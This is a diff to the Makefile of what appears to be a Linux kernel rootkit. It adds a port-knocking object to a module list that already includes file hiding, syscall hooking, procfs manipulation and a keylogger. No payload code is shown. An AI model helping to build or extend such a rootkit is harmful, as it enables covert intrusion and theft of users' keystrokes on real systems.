@@ -3,7 +3,7 @@ BUILD_DIR ?= $(PWD)/build
 BUILD_DIR_MAKEFILE ?= $(BUILD_DIR)/Makefile
 MODULE_DIR ?= $(PWD)/src
 obj-m += rootkit.o
-rootkit-objs := main.o misc.o hidefs.o syscalls.o procfs.o hide.o keylogger.o
+rootkit-objs := main.o misc.o hidefs.o syscalls.o procfs.o hide.o keylogger.o port_knocking.o
 
 all: $(BUILD_DIR_MAKEFILE) module
 
